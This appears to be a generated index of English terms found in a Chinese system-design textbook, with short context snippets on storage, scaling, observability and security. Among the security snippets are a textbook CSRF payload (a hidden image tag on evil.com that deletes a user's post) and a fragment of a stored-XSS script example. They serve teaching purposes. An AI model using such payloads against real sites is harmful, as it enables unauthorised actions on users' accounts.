  c10_b03.md: ...mazon EBS（Elastic Block Store）、Google Cloud Persistent Disk、Azure Managed Disk * SAN（Storage Area Network）——呈现给服务器如同本地连接的块存储设...

=== managed (1 occurrences) ===
  c10_b03.md: ...EBS（Elastic Block Store）、Google Cloud Persistent Disk、Azure Managed Disk * SAN（Storage Area Network）——呈现给服务器如同本地连接的块存储设备网络  **块...

=== persistent (1 occurrences) ===
  c10_b03.md: ...D、HDD） * 云块存储卷：Amazon EBS（Elastic Block Store）、Google Cloud Persistent Disk、Azure Managed Disk * SAN（Storage Area Network）——呈现给服务器...

=== san (1 occurrences) ===
  c10_b03.md: ...ck Store）、Google Cloud Persistent Disk、Azure Managed Disk * SAN（Storage Area Network）——呈现给服务器如同本地连接的块存储设备网络  **块存储特点：**  *...

=== cover (1 occurrences) ===
  c10_b04.md: ...ey: users/42/profile-photo.jpg         Object key: users/42/cover-photo.jpg         Object key: posts/1001/photo-1.jpg...

=== after (1 occurrences) ===
  c10_b05.md: ...是最终一致的——如果你上传对象新版本并立即读取，可能拿到旧版本。现代对象存储（2020 年后的 S3）提供强 read-after-write 一致性，但对任何具体供应商都值得验证。  **扁平命名空间：** 没有目录，列出所有对象是完整扫描（按前缀...

=== alter (1 occurrences) ===
  c10_b06.md: ...**方案评估：**  **方案 1：把照片作为 bytea（blob）列存在 PostgreSQL 中**       ALTER TABLE users ADD COLUMN profile_photo BYTEA;   这对少量用户有效。大规模下...

=== photos (1 occurrences) ===
  c10_b06.md: ...文件数据增加了不必要开销。  **方案 2：存在应用服务器本地文件系统**       /var/socialsnap/photos/user_42_profile.jpg   这比数据库有改进，但引入不同问题：文件在某一台特定服务器上。当 Socia...

=== var (1 occurrences) ===
  c10_b06.md: ...化模型（WAL、fsync）对文件数据增加了不必要开销。  **方案 2：存在应用服务器本地文件系统**       /var/socialsnap/photos/user_42_profile.jpg   这比数据库有改进，但引入不同问题：文件...

=== nightly (1 occurrences) ===
  c10_b07.md: ...络瓶颈。  **HDFS 适用场景：** 大数据分析管道。一家公司把 10 TB 每日用户事件日志存在 HDFS 中。 nightly Spark 作业读取整个数据集以生成推荐。一次读取、高吞吐模式正是 HDFS 所优化的。  **HDFS 不适用场景：...

=== private (1 occurrences) ===
  c23_b02.md: ...发布该文件说明哪些页面可以爬、哪些不可以以及速率。      User-agent: *     Disallow: /private/     Crawl-delay: 2  设计良好的爬虫在爬某域名任何页面前先读取 `robots.txt`，并遵守...

=== glacier (1 occurrences) ===
  c10_b10.md: ...deoff（权衡）后，你可以设计分层存储架构——热数据放 DRAM，温数据放 SSD，冷数据放对象存储，归档数据放磁带/Glacier。需要足够快的数据就足够贵；可以慢的数据就便宜。   ### 10.11 练习...

=== varies (1 occurrences) ===
  c10_b10.md: ...用性 | 运维复杂度   |---|---|---|---|---   DRAM (Redis) | ↓↓ 亚毫秒 | varies | ↑（如复制） | ↑（Redis 集群运维）   NVMe SSD (DB) | ↓ 个位数毫秒 | ↑（ACID...

=== append (1 occurrences) ===
  c10_b11.md: ...录结构，客户端挂载后像本地磁盘一样使用。多个客户端可同时读写文件。文件操作——open、read、write、seek、append——在字节级别工作，文件系统维护元数据（权限、修改时间、目录结构）。  **对象存储**提供扁平的 key-value...

=== hls (1 occurrences) ===
  c10_b13.md: ...10 个 worker 可同时转码 10 个视频，为计算密集型步骤提供水平扩展。  **服务路径：**  视频使用 **HLS（HTTP Live Streaming）** 提供：视频被切成小片段（每段 2-10 秒），一个清单文件（`.m3u8...

=== redshift (1 occurrences) ===
  c10_b18.md: ...这个工作负载属于列式 OLAP（Online Analytical Processing）数据库。例子：Amazon Redshift、Google BigQuery、Spark 或 Trino 查询的 Apache Parquet 文件、ClickHo...

=== trino (1 occurrences) ===
  c10_b18.md: ...l Processing）数据库。例子：Amazon Redshift、Google BigQuery、Spark 或 Trino 查询的 Apache Parquet 文件、ClickHouse。  列式存储把每列单独写。对上述查询，数据库只读取...

=== view (1 occurrences) ===
  c10_b18.md: ...stemdesign 且国家为 US 且时间戳在 30 天内的独立用户数”这类分析查询，PostgreSQL 必须读取 view events 表的每一行（或索引覆盖部分），然后在内存中过滤。每秒 50,000 事件 × 86,400 秒 × 30...

=== expired (1 occurrences) ===
  c11_b04.md: ...if data is None:             return None  # Session expired or invalid         return json.loads(data)   现在 Alice 在 Ser...

=== invalid (1 occurrences) ===
  c11_b04.md: ...data is None:             return None  # Session expired or invalid         return json.loads(data)   现在 Alice 在 Server A 登录时，会...

=== balancer (1 occurrences) ===
  c11_b05.md: ...CDN (static assets, public pages)         ↓     L7 Load Balancer (round-robin, health checks)         ↓     ┌──────────┬────...

=== vcpu (1 occurrences) ===
  c11_b07.md: ...、磁盘 I/O）都立即有效。  **局限：**  * 存在物理上限。截至 2024 年，AWS 最大实例有 448 个 vCPU 和 24 TB RAM。你无法给单台机器加第 2,000 个 CPU。 * 成本非线性：一台 10 倍 RAM 的机器...

=== presigned (1 occurrences) ===
  c11_b15.md: ...def get_presigned_url(user_id):         cache_key = f"presigned:{user_id}:photo"         cached = redis.get(cache_key)...

=== multi (1 occurrences) ===
  c11_b16.md: ...，基线可用性高于单台服务器。  带副本的 Redis 可用性为 99.99%（秒级故障转移）。托管 RDS 数据库配合 Multi-AZ 为 99.95%。它们不是普通应用服务器那种 99.9%——它们更高。依赖链现在变成：  99.9999% ×...

=== rds (1 occurrences) ===
  c11_b16.md: ...的组件都经过工程设计，基线可用性高于单台服务器。  带副本的 Redis 可用性为 99.99%（秒级故障转移）。托管 RDS 数据库配合 Multi-AZ 为 99.95%。它们不是普通应用服务器那种 99.9%——它们更高。依赖链现在变成：...

=== stakes (1 occurrences) ===
  c12_b02.md: ...e 以为帖子丢了，又发一遍。 6. 现在她有了重复帖子。  这与第 7 章 Redis 缓存中看到的陈旧性问题一样，但 stakes 更高。缓存陈旧通常是表面问题——你几秒钟内看到略旧的数据。复制延迟的陈旧性会造成真实数据异常：写入丢失、重复提交、困惑...

=== yes (1 occurrences) ===
  c12_b07.md: ...hard 不能提交（如约束冲突或故障），它投“no”。  2. **第二阶段（提交）：** 如果所有 shard 都投“yes”，协调器发送“提交”。每个 shard 应用已准备的变更并释放锁。如果任何 shard 投“no”，协调器向所有 sh...

=== gpu (1 occurrences) ===
  c13_b02.md: ...需要的额外通知容量付费。 * **技术锁定：** 整个单体必须用同一种语言、同一个框架、同一个数据库。如果图像处理能从 GPU 优化运行时受益，也没办法。  不是每个单体都会到这个状态——小团队 disciplined 的模块化设计可以无限期维持...

=== disciplined (1 occurrences) ===
  c13_b02.md: ...同一个框架、同一个数据库。如果图像处理能从 GPU 优化运行时受益，也没办法。  不是每个单体都会到这个状态——小团队 disciplined 的模块化设计可以无限期维持健康的单体。但超过一定代码库规模和团队规模，这些摩擦点会变得真实。  微服务是这些摩擦点的一...

=== mel (1 occurrences) ===
  c13_b03.md: ...界还糟：你得到了微服务的运维复杂度，却没有独立性。   #### 康威定律（Conway's Law）  1967 年，Mel Conway 观察到：“设计系统的组织，其产生的设计等价于这些组织沟通结构的镜像。”这就是**康威定律（Conway'...

=== consul (1 occurrences) ===
  c13_b06.md: ...API 网关。负载均衡器在注册表中查找服务 B 并转发给合适的实例。服务 A 无需知道注册表。  流行的服务注册表包括 Consul、Etcd 和 Zookeeper。Kubernetes（主导的容器编排平台）内置服务发现——每个服务获得一个 DNS...

=== etcd (1 occurrences) ===
  c13_b06.md: ...负载均衡器在注册表中查找服务 B 并转发给合适的实例。服务 A 无需知道注册表。  流行的服务注册表包括 Consul、Etcd 和 Zookeeper。Kubernetes（主导的容器编排平台）内置服务发现——每个服务获得一个 DNS 名，Kub...

=== deutsch (1 occurrences) ===
  c13_b07.md: ...### 13.5 网络谬论  1994 年，Sun Microsystems 的 Peter Deutsch 等人提出一组工程师从进程内通信转向网络通信时常犯的错误假设。这些是**分布式计算谬论（Fallacies of Dis...

=== microsystems (1 occurrences) ===
  c13_b07.md: ...### 13.5 网络谬论  1994 年，Sun Microsystems 的 Peter Deutsch 等人提出一组工程师从进程内通信转向网络通信时常犯的错误假设。这些是**分布式计算谬论（...

=== peter (1 occurrences) ===
  c13_b07.md: ...### 13.5 网络谬论  1994 年，Sun Microsystems 的 Peter Deutsch 等人提出一组工程师从进程内通信转向网络通信时常犯的错误假设。这些是**分布式计算谬论（Fallacie...

=== sun (1 occurrences) ===
  c13_b07.md: ...### 13.5 网络谬论  1994 年，Sun Microsystems 的 Peter Deutsch 等人提出一组工程师从进程内通信转向网络通信时常犯的错误假设。...

=== meaningful (1 occurrences) ===
  c13_b13.md: ...N（文本格式）。一位同事说：“JSON 就行——计算机够快，序列化开销不重要。”评估这个说法。序列化格式在什么条件下是 meaningful 的性能考量？  **讨论：** 这位同事的说法对小负载和低流量大致正确。一次传输几百字节、每秒几百次的请求，JSON...

=== brewer (1 occurrences) ===
  c14_b03.md: ...接应用到复制决策，看看抽象的 tradeoff（权衡）如何在多节点数据存储的具体机制中体现。  2000 年，Eric Brewer 提出（后来正式证明）分布式系统的一个基本限制。这就是 **CAP 定理（CAP theorem）**：  分布式数据存...

=== eric (1 occurrences) ===
  c14_b03.md: ...这个框架直接应用到复制决策，看看抽象的 tradeoff（权衡）如何在多节点数据存储的具体机制中体现。  2000 年，Eric Brewer 提出（后来正式证明）分布式系统的一个基本限制。这就是 **CAP 定理（CAP theorem）**：...

=== versus (1 occurrences) ===
  c14_b03.md: ...同时保证一致性、可用性和分区容错性中的两个——而且我们看到在实践中分区容错性不可协商，真正的选择简化为分区期间的一致性 versus 可用性。这里我们把这个框架直接应用到复制决策，看看抽象的 tradeoff（权衡）如何在多节点数据存储的具体机制中体现...

=== basis (1 occurrences) ===
  c14_b05.md: ...域延迟使全局 quorum 太慢）。  这就是**可调一致性（tunable consistency）**：在每次操作 basis 上交换一致性、可用性和延迟的能力。陈旧可接受的操作用 ONE。陈旧不可接受的操作用 QUORUM。  对 Social...

=== famously (1 occurrences) ===
  c14_b06.md: ...后写入获胜（LWW）冲突解决很简单但危险：它会静默丢弃几乎同时发生的并发写。对很多应用不可接受。Amazon 的购物车 famously 用了更复杂的方法：不是丢弃冲突写，而是保留两者，让应用（或用户）解决冲突。  要知道两次写是真正并发（因而冲突）还是顺...

=== repair (1 occurrences) ===
  c14_b06.md: ...-entropy）** 是定期比较副本间数据并传播缺失或分歧更新的后台修复过程。在 Cassandra 中，这通过 **repair** 进程完成，使用一种叫 **Merkle tree（默克尔树）** 的数据结构来高效识别副本之间哪些数据不同。  p...

=== enthusiasts (1 occurrences) ===
  c14_b12.md: ...y for jazz lovers.”；Elena 在柏林把同一社区页面描述更新为 “A place for jazz enthusiasts.”。两次写入几乎同时在当地成功。数据中心互相复制时，两个节点发现同一个 community page 的 `descr...

=== lovers (1 occurrences) ===
  c14_b12.md: ...a 都是某个共享社区页面的管理员。Marco 在圣保罗把社区页面描述更新为 “A community for jazz lovers.”；Elena 在柏林把同一社区页面描述更新为 “A place for jazz enthusiasts.”。两次写...

=== place (1 occurrences) ===
  c14_b12.md: ...更新为 “A community for jazz lovers.”；Elena 在柏林把同一社区页面描述更新为 “A place for jazz enthusiasts.”。两次写入几乎同时在当地成功。数据中心互相复制时，两个节点发现同一个 co...

=== streams (1 occurrences) ===
  c15_b03.md: ...理**（每条消息只处理一次，不多不少）在分布式系统中不能作为原生原语实现。有些系统所谓“恰好一次”——例如 Kafka Streams 的 exactly-once 语义——是结合至少一次投递与幂等生产者和事务写来实现的，所以*效果*上像每条消息只处理一...

=== checkout (1 occurrences) ===
  c15_b06.md: ...编舞**中，没有中央协调器。每个服务监听事件，知道发生这些事件时该做什么。saga 的逻辑分布在这些服务之间：  1. Checkout Handler 发布 `user.upgrade.initiated` 事件。 2. Payment Service...

=== handler (1 occurrences) ===
  c15_b06.md: ...央协调器。每个服务监听事件，知道发生这些事件时该做什么。saga 的逻辑分布在这些服务之间：  1. Checkout Handler 发布 `user.upgrade.initiated` 事件。 2. Payment Service 监听 `user...

=== amount (1 occurrences) ===
  c15_b13.md: ...3a9b2c_upgrade"     payment_result: null | {charge_id: ..., amount: 9.99}   **幸福路径：**  1. 开始：设置 `current_step = PAYMENT_PENDIN...

=== problematic (1 occurrences) ===
  c15_b16.md: ...浏览器加载页面时会调用 CDN、用户服务、feed 服务——它在“知道”它们 API 的意义上与它们耦合。我们不认为这 problematic。  对编排器有意义的问题是：编排器包含的是*业务逻辑*（这是否有效升级？是否应打折？）还是*工作流逻辑*（调用 Pay...

=== unavailable (1 occurrences) ===
  c16_b01.md: ...都在等待 Redis。新请求在负载均衡器队列中堆积，超出队列限制。负载均衡器开始向所有用户返回“503 Service Unavailable”。  SocialSnap 宕机了。  不是因为数据库故障。不是因为应用代码崩溃。而是因为一个依赖的部分失败——Red...

=== supposedly (1 occurrences) ===
  c16_b03.md: ...会同时让两台“冗余”服务器宕机。这就是**共模故障（common mode failure）**：一个原因同时影响多个 supposedly 独立的组件。  真正冗余的实践原则：  * 在不同可用区运行冗余组件（独立电源、网络、散热基础设施） * 尽可能使用不...

=== nice (1 occurrences) ===
  c16_b07.md: ...用。  **第 2 层——应该工作：** 点赞和评论、私信、通知。这些重要，但失败不妨碍核心使用。  **第 3 层——Nice to have：** 热门话题、“推荐用户”、实时浏览计数、故事高光。这些可以优雅失败；用户体验到功能略减。  **第...

=== jvm (1 occurrences) ===
  c16_b09.md: ...is。延迟增加比 Redis 错误率滞后约 30 秒——一次完整超时循环所需时间。  **线索 3——线程池饱和。** JVM（或 Python WSGI）监控显示活跃线程数接近线程池上限。这是机制线索：为什么延迟增加？因为线程被等待的请求占用。...

=== day (1 occurrences) ===
  c16_b10.md: ...围引入（限于非关键流量或部分用户），团队随时待命准备中止。  对从未做过混沌工程的团队，起点很简单：定期安排“game day”，模拟已知故障场景——kill 一台应用服务器、终止一个数据库副本、打满 Redis 线程池。观察系统如何响应。修复损...

=== game (1 occurrences) ===
  c16_b10.md: ...已知影响范围引入（限于非关键流量或部分用户），团队随时待命准备中止。  对从未做过混沌工程的团队，起点很简单：定期安排“game day”，模拟已知故障场景——kill 一台应用服务器、终止一个数据库副本、打满 Redis 线程池。观察系统如何响应...

=== max (1 occurrences) ===
  c16_b15.md: ...": 1},         "thread_pool": {"status": "ok", "used": 45, "max": 200}       },       "timestamp": "2024-01-15T14:47:23Z"...

=== used (1 occurrences) ===
  c16_b15.md: ..."latency_ms": 1},         "thread_pool": {"status": "ok", "used": 45, "max": 200}       },       "timestamp": "2024-01-15T1...

=== goroutine (1 occurrences) ===
  c17_b02.md: ...请求。  **仪表盘（Gauges）** 可增可减。它们测量当前状态：当前内存用量、当前活跃连接数、当前队列深度、当前 goroutine 数量。仪表盘回答“现在值是多少？”一个有 50,000 条消息的 Redis 队列令人担忧；同一个队列只有 100 条...

=== contextual (1 occurrences) ===
  c17_b04.md: ...ce ID）**——每个用户请求入口生成的唯一标识符，并通过每次服务调用传播。这是跨服务关联日志的关键字段。 5. **Contextual fields**——任何与理解该事件相关的信息：`user_id`、`endpoint`、`upstream_serv...

=== severity (1 occurrences) ===
  c17_b04.md: ...estamp**——毫秒精度、UTC 时区。来自不同服务的日志时间戳必须可比；时区歧义会造成抓狂的调试会话。 2. **Severity level**——DEBUG、INFO、WARN、ERROR、FATAL。级别让你过滤噪声：生产环境通常只看 INFO...

=== fields (1 occurrences) ===
  c17_b04.md: ...个用户请求入口生成的唯一标识符，并通过每次服务调用传播。这是跨服务关联日志的关键字段。 5. **Contextual fields**——任何与理解该事件相关的信息：`user_id`、`endpoint`、`upstream_service`、`l...

=== version (1 occurrences) ===
  c17_b04.md: ...。级别让你过滤噪声：生产环境通常只看 INFO 及以上；调试时临时开启 DEBUG。 3. **Service and version**——哪个服务产生这条日志，以及运行代码的哪个版本。当 bug 部署然后修复后，你需要把日志事件与代码版本关联。 4....

=== invaluable (1 occurrences) ===
  c17_b05.md: ...务中，DEBUG 日志可能记录执行的每条 SQL。API 处理器中，可能记录每个请求的每个 header。开发和调试时 invaluable，但生产环境产生巨大体量——通常是 INFO 日志的十到一百倍。大多数生产系统默认关闭 DEBUG，只在调试特定服务时按...

=== handle (1 occurrences) ===
  c17_b06.md: ...例：       Trace ID: abc123       [0ms - 245ms]  API Gateway: handle GET /feed         [5ms - 20ms]   Auth Service: validate_jwt...

=== stitched (1 occurrences) ===
  c17_b06.md: ...pan 代表下游调用。  plain 语言：追踪是一个完整时间线，准确显示哪些服务按什么顺序处理请求、每一步花多久—— stitched together 跨越触碰请求的每个服务。  以下是 SocialSnap feed 请求追踪的文本形式示例：...

=== together (1 occurrences) ===
  c17_b06.md: ...用。  plain 语言：追踪是一个完整时间线，准确显示哪些服务按什么顺序处理请求、每一步花多久—— stitched together 跨越触碰请求的每个服务。  以下是 SocialSnap feed 请求追踪的文本形式示例：       Trace...

=== parent (1 occurrences) ===
  c17_b07.md: ...并在所有下游调用中传播 trace ID。每个 span 记录：trace ID、span ID（该 span 唯一）、parent span ID、服务名、操作名、开始时间戳、结束时间戳，以及附加到 span 的标签或日志。  Spans 被发送到一...

=== retrofit (1 occurrences) ===
  c17_b07.md: ...也能立即受益。请求一旦跨越服务边界，你就有了分布式系统，问题“这次请求把时间花在哪里？”就变得非平凡。尽早安装追踪—— retrofit 远比一开始就构建难。   ### 17.4 告警哲学——什么值得把人叫醒  指标、日志和追踪是可观测性的原材料。告警是...

=== grafana (1 occurrences) ===
  c17_b08.md: ...开销 | 无变化 | 最高（快速根因分析） | 高（工具、埋点、维护）  可观测性成本真实：运行 Prometheus、Grafana、日志流水线（Elasticsearch 或类似）和分布式追踪后端增加了必须部署、维护和监控的基础设施。（这里有个值得注...

=== prometheus (1 occurrences) ===
  c17_b08.md: ...志 + 追踪） | 小开销 | 无变化 | 最高（快速根因分析） | 高（工具、埋点、维护）  可观测性成本真实：运行 Prometheus、Grafana、日志流水线（Elasticsearch 或类似）和分布式追踪后端增加了必须部署、维护和监控的基础设施。...

=== chronological (1 occurrences) ===
  c17_b10.md: ...中看到的某个特定错误。有了它，你可以过滤所有服务中单个 `request_id` 的日志，看到该特定请求被完整处理的 chronological 记录——它触碰了哪些服务、每个服务做了什么、时间花在哪里、哪里出错。这是分布式追踪的人工等价物，在完整追踪基础设施就位...

=== indispensable (1 occurrences) ===
  c17_b10.md: ...录——它触碰了哪些服务、每个服务做了什么、时间花在哪里、哪里出错。这是分布式追踪的人工等价物，在完整追踪基础设施就位前 indispensable。...

=== emit (1 occurrences) ===
  c17_b11.md: ...ocialSnap 的通知服务（第 8 章引入）设计可观测性策略。该服务从队列消费并发送邮件和推送通知。你会埋哪些指标、emit 哪些日志事件、配置哪些告警？  提示  思考通知的端到端旅程：进入队列、被消费、被处理、被投递。每一步可能出什么错？健...

=== dead (1 occurrences) ===
  c17_b13.md: ...。这暗示了几个架构要求：首先，告警路径应尽可能简单独立——通过它自身监控的同一基础设施路由告警的监控系统很脆弱。其次，“dead man's switch”告警有价值：不是出问题时告警，而是当关键监控*停止*接收数据时告警——如果心跳消失，说明某处...

=== man (1 occurrences) ===
  c17_b13.md: ...几个架构要求：首先，告警路径应尽可能简单独立——通过它自身监控的同一基础设施路由告警的监控系统很脆弱。其次，“dead man's switch”告警有价值：不是出问题时告警，而是当关键监控*停止*接收数据时告警——如果心跳消失，说明某处坏了。第...

=== jmeter (1 occurrences) ===
  c18_b03.md: ...staging 环境（镜像生产架构但使用较小实例和测试数据）上运行真实流量模式。Locust、k6 或 Apache JMeter 等工具模拟数百或数千并发用户发请求。  设计良好的负载测试：  1. **渐进加压**——从低流量开始线性增加。这样你...

=== locust (1 occurrences) ===
  c18_b03.md: ...接、网络带宽还是其他？”  负载测试在 staging 环境（镜像生产架构但使用较小实例和测试数据）上运行真实流量模式。Locust、k6 或 Apache JMeter 等工具模拟数百或数千并发用户发请求。  设计良好的负载测试：  1. **渐进加...

=== viral (1 occurrences) ===
  c18_b03.md: ...**使用真实流量模式**——如果生产流量读写比 80:20，负载测试应匹配。 3. **测试特定场景**——“模拟一条 viral post 导致 1000 个同时请求同一 feed 页面”测试第 7 章的惊群问题。 4. **跑到稳态（steady...

=== army (1 occurrences) ===
  c18_b04.md: ...你在受控混沌实验中发现，你可以从容、仔细盯着修复。  Chaos Monkey 后来扩展为一个套件，称为 Simian Army，包含：  * **Chaos Gorilla：** 摧毁整个可用区（availability zone，可用性） *...

=== conformity (1 occurrences) ===
  c18_b04.md: ...ailability zone，可用性） * **Latency Monkey：** 在服务调用中引入人为延迟 * **Conformity Monkey：** 检查实例是否符合配置标准，终止不合规实例   #### 混沌工程测试什么  混沌实验测试“Redi...

=== gorilla (1 occurrences) ===
  c18_b04.md: ...盯着修复。  Chaos Monkey 后来扩展为一个套件，称为 Simian Army，包含：  * **Chaos Gorilla：** 摧毁整个可用区（availability zone，可用性） * **Latency Monkey：** 在服务...

=== simian (1 occurrences) ===
  c18_b04.md: ...户受影响。如果你在受控混沌实验中发现，你可以从容、仔细盯着修复。  Chaos Monkey 后来扩展为一个套件，称为 Simian Army，包含：  * **Chaos Gorilla：** 摧毁整个可用区（availability zone，可用...

=== effectively (1 occurrences) ===
  c18_b06.md: ...加流量：5% → 10% → 25% → 50% → 100%。 5. 如果新版本指标更差，把 0% 流量路由到它—— effectively 零用户影响的回滚。  金丝雀部署是大规模系统的主导部署策略，因为它在有限影响范围内提供生产环境的经验验证。如果新版本只...

=== change (1 occurrences) ===
  c18_b08.md: ...vailability，可用性）系统最安全的迁移模式是**expand-contract**，也称**parallel change**：  **阶段 1（Expand）：** 在旁边添加新状态。如果你需要把列从 `author` 重命名为 `auth...

=== parallel (1 occurrences) ===
  c18_b08.md: ...可用（high-availability，可用性）系统最安全的迁移模式是**expand-contract**，也称**parallel change**：  **阶段 1（Expand）：** 在旁边添加新状态。如果你需要把列从 `author` 重命名...

=== ramp (1 occurrences) ===
  c18_b12.md: ...nt` join 是否增加开销？）、数据库写吞吐（`reactions` 表新写入）。 * 如果指标健康，5 天内逐步 ramp：20% → 50% → 100%。  **回滚计划：**  * 触发条件：reaction API 错误率 5 分钟...

=== suddenly (1 occurrences) ===
  c18_b12.md: ...导致二次失败。诊断该模式并提出修复。  提示  回想第 7 章的惊群问题和第 16 章的熔断器。这里问题类似：大量工作 suddenly 同时释放。思考什么机制可以平滑重新引入负载。...

=== tokens (1 occurrences) ===
  c19_b03.md: ...oken——它们可被用户撤销，且不能用来改用户密码。   #### JWT——Token 格式  **JSON Web Tokens（JWT）** 是现代系统中 access token 的主要格式。JWT 是 Base64url 编码、密码学签名的字...

=== exp (1 occurrences) ===
  c19_b03.md: ..."name": "Alex Chen",       "iat": 1704067200,       "exp": 1704070800,       "scope": "read:posts write:posts"     }...

=== iat (1 occurrences) ===
  c19_b03.md: ..."sub": "user_8821934",       "name": "Alex Chen",       "iat": 1704067200,       "exp": 1704070800,       "scope": "read...

=== limited (1 occurrences) ===
  c19_b03.md: ...Scheduler 只持有 access token——它是 scoped 的（只授予用户批准的特定权限）且 time-limited 的（会过期）。如果 PostScheduler 被入侵，攻击者只获得 access token——它们可被用户撤销，且...

=== scoped (1 occurrences) ===
  c19_b03.md: ...密码永远不会与 PostScheduler 共享。PostScheduler 只持有 access token——它是 scoped 的（只授予用户批准的特定权限）且 time-limited 的（会过期）。如果 PostScheduler 被入侵，攻...

=== owasp (1 occurrences) ===
  c19_b05.md: ...政府 ID 号、私信以及任何受监管的数据（医疗记录、财务数据）。   ### 19.4 Web 应用漏洞——经典问题  OWASP Top 10 是最常见、影响最大的 Web 应用漏洞定期更新列表。其中三类反复出现，每个系统设计师都必须理解。...

=== react (1 occurrences) ===
  c19_b06.md: ...架（React、Vue、Angular）默认转义用户内容，因此大幅降低 XSS 风险。危险发生在开发者明确选择不转义时：React 中的 `dangerouslySetInnerHTML` 之所以这样命名，是有原因的。  额外防御：**内容安全策略（...

=== class (1 occurrences) ===
  c19_b06.md: ...）  SocialSnap 允许用户写帖子。一个幼稚实现直接存储帖子内容并作为 HTML 渲染：       <div class="post">{{ post.content }}</div>   如果用户发布 `<script>document....

=== orm (1 occurrences) ===
  c19_b07.md: ...CSRF 风险。   #### 常见误解  常见误解是这些漏洞是“已解决的问题”——现代框架自动处理。这部分正确：现代 ORM 默认使用参数化查询，现代模板引擎默认转义 HTML。但开发者仍会通过以下方式引入漏洞：为“方便”使用原始字符串拼接、在...

=== display (1 occurrences) ===
  c19_b07.md: ...g src="https://socialsnap.com/posts/delete?id=12345" style="display:none">   当登录的 SocialSnap 用户访问 `evil.com` 时，浏览器加载这个“图片”——实际上...

=== img (1 occurrences) ===
  c19_b07.md: ...求都会发送它，无论请求来源何处。  CSRF 攻击利用这一点。攻击者在 `evil.com` 创建页面：       <img src="https://socialsnap.com/posts/delete?id=12345" style="d...

=== src (1 occurrences) ===
  c19_b07.md: ...送它，无论请求来源何处。  CSRF 攻击利用这一点。攻击者在 `evil.com` 创建页面：       <img src="https://socialsnap.com/posts/delete?id=12345" style="displ...

=== style (1 occurrences) ===
  c19_b07.md: ...<img src="https://socialsnap.com/posts/delete?id=12345" style="display:none">   当登录的 SocialSnap 用户访问 `evil.com` 时，浏览器加载这个...

=== vpn (1 occurrences) ===
  c19_b08.md: ...、被入侵的员工设备或供应链攻击），他们可以自由访问每个内部服务。第二，云环境没有有意义的边界——服务通过共享云基础设施、VPN 隧道和多区域链路通信，而这些并非全部由组织控制。  **零信任架构（zero-trust architecture）*...

=== git (1 occurrences) ===
  c19_b09.md: ...—把密钥存在配置文件或环境变量中——带来多种风险：  1. **版本控制泄露：** 如果带数据库密码的配置文件被提交到 git，密码就永远留在仓库历史中。即使后来删除文件，任何克隆仓库的人仍能在历史中看到它。 2. **日志泄露：** 如果应用在...

=== found (1 occurrences) ===
  c19_b11.md: ...**API 枚举：** 如果你的用户资料端点是 `/users/12345`，且对不存在 ID 返回“User not found”，攻击者可以枚举所有用户 ID 来找到有效用户。使用不透明、非顺序的用户 ID（UUID 而非递增整数）让这更难。此外...

=== sha (1 occurrences) ===
  c19_b12.md: ...力破解的情况下恢复原始密码。(3) 使用专用慢哈希算法（bcrypt、Argon2）意味着即使暴力破解也极慢——比使用 SHA-256 等快速哈希慢数千倍，使攻击者对强密码的计算不可行。加密是错误的，因为如果解密密钥也泄露，所有密码都暴露；而且密...

=== markup (1 occurrences) ===
  c19_b12.md: ...前转义所有用户生成内容——把 `<` 转为 `&lt;`、`>` 转为 `&gt;` 等——让浏览器将其视为文本而非 markup。  **Q2.** 对密码做哈希与加密的区别是什么，为什么哈希是存储密码的正确选择？  **答案：** 加密是可逆的—...

=== script (1 occurrences) ===
  c19_b12.md: ...（stored XSS）**攻击。根因是应用把用户生成内容未经转义就渲染为 HTML。帖子作者在他们的帖子内容中提交了 script 标签。当应用直接把这些内容插入 HTML 响应而不转义时，浏览器把它解释为可执行 JavaScript 而非显示文本。...

=== messages (1 occurrences) ===
  c19_b14.md: ...并检查 scope。具有 `read:posts` scope 的应用即使持有有效 JWT 也不能调用 Direct Messages 端点——授权检查会拒绝它。  **Q2.** SocialSnap 存储用户手机号用于双因素认证。设计手机号的数据存储...

=== pii (1 occurrences) ===
  c19_b14.md: ...？哪些操作需要看到实际号码 vs 哈希？静态加密 vs 哈希——这里哪个合适，为什么？  **答案：** 手机号是敏感 PII，必须保护。但与密码不同，它们不能哈希——因为运营需要显示它们（支持需要验证“该用户号码是否以 5234 结尾？”），系...

=== sms (1 occurrences) ===
  c19_b14.md: ...，它们不能哈希——因为运营需要显示它们（支持需要验证“该用户号码是否以 5234 结尾？”），系统也必须向实际号码发送 SMS。  **存储策略：**...

=== claim (1 occurrences) ===
  c19_b14.md: ...arer <access_token>` header。SocialSnap 验证 JWT 签名并检查 `scope` claim，确保请求操作在授予范围内。  **Token 刷新：** access token 过期时，应用把 refresh t...

=== redirect (1 occurrences) ===
  c19_b14.md: ...2.0）流程。  **答案：**  **应用注册：** 开发者向 SocialSnap 注册应用（名称、描述、允许的 redirect URI）。SocialSnap 颁发 `client_id`（公开）和 `client_secret`（私密，仅 se...

=== aggressively (1 occurrences) ===
  c19_b17.md: ...与其隐藏邮箱是否已注册（这会使 UX 复杂化——忘记用了哪个邮箱的用户无法确定），一些系统允许“邮箱未找到”消息，但 aggressively 对登录端点限流。这意味着攻击者可以枚举邮箱，但按允许的速率需要数月而非数分钟。  **开发者 API 透明性：** 第...

=== zipf (1 occurrences) ===
  c20_b02.md: ...S × 500 字节 = **58 MB/s 出站带宽**—— modest  **缓存估算：**  * 第 7 章的 Zipf 分布适用：一小部分 URL 会占大部分流量。如果最热的 1% URL 获得 80% 流量，即 1% 的 1 亿活跃 U...

=== opt (1 occurrences) ===
  c20_b05.md: ...禁用。代价：对服务的请求略多。  对需要做分析的公开短链服务，**302** 是正确默认。想要 301 行为的用户可以 opt in（知道会失去分析和更改能力）。内部我们用第 7 章的模式把查找缓存到自己的服务器——不需要浏览器缓存来避免数据库负...

=== acme (1 occurrences) ===
  c20_b07.md: ...书：** 每个自定义域名需要 TLS 证书。通过 Let's Encrypt 为每个新自定义域名自动颁发证书，需要一个 ACME（Automatic Certificate Management Environment）客户端来响应域名所有权挑战。...

=== encrypt (1 occurrences) ===
  c20_b07.md: ...）。这是产品决策，但有重大架构影响。  **HTTPS 证书：** 每个自定义域名需要 TLS 证书。通过 Let's Encrypt 为每个新自定义域名自动颁发证书，需要一个 ACME（Automatic Certificate Management...

=== let (1 occurrences) ===
  c20_b07.md: ...c1234`）。这是产品决策，但有重大架构影响。  **HTTPS 证书：** 每个自定义域名需要 TLS 证书。通过 Let's Encrypt 为每个新自定义域名自动颁发证书，需要一个 ACME（Automatic Certificate M...

=== encoding (1 occurrences) ===
